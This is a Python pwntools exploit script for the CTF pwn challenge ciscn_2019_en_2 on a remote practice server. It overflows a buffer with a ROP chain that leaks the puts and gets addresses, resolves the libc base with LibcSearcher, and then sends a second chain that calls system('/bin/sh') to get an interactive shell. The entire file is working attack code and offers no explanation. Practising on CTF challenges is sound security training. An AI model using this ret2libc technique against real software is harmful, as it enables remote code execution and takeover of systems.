from LibcSearcher import LibcSearcher
from pwn import *


def ciscn_2019_en_2(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/ciscn_2019_en_2'):
    context(log_level='debug', arch='amd64', os='linux')
    target = process([file_name])
    target = remote('node5.buuoj.cn', 27621)
    target_elf = ELF(file_name)

    pop_ret_gadget = p64(0x400c83)  # pop rdi ; ret

    puts_plt = p64(target_elf.plt['puts'])
    puts_got = p64(target_elf.got['puts'])
    gets_got = p64(target_elf.got['gets'])
    encrypt_addr = p64(0x4009A0)

    print(p64(target_elf.symbols['encrypt']))

    payload_1 = b'A' * (0x50 + 0x8)
    # puts(puts_got)
    payload_1 += pop_ret_gadget + puts_got + puts_plt
    # puts(gets_got)
    payload_1 += pop_ret_gadget + gets_got + puts_plt
    # encrypt()
    payload_1 += encrypt_addr

    target.sendline(b'1')
    target.sendlineafter('encrypted', payload_1)

    print(target.recvline())
    print(target.recvline())
    print(target.recvline())
    puts_addr = u64(target.recvline()[:6].ljust(8, b'\x00'))
    gets_addr = u64(target.recvline()[:6].ljust(8, b'\x00'))

    searcher = LibcSearcher('puts', puts_addr)
    searcher.add_condition('gets', gets_addr)
    libc_base_addr = puts_addr - searcher.dump('puts')
    system_addr = p64(libc_base_addr + searcher.dump('system'))
    bin_sh_str = p64(libc_base_addr + searcher.dump('str_bin_sh'))

    payload_2 = b'A' * (0x50 + 0x8)
    # system(/bin/sh)
    payload_2 += pop_ret_gadget + bin_sh_str + system_addr

    target.sendline(payload_2)

    target.interactive()


if __name__ == '__main__':
    ciscn_2019_en_2()
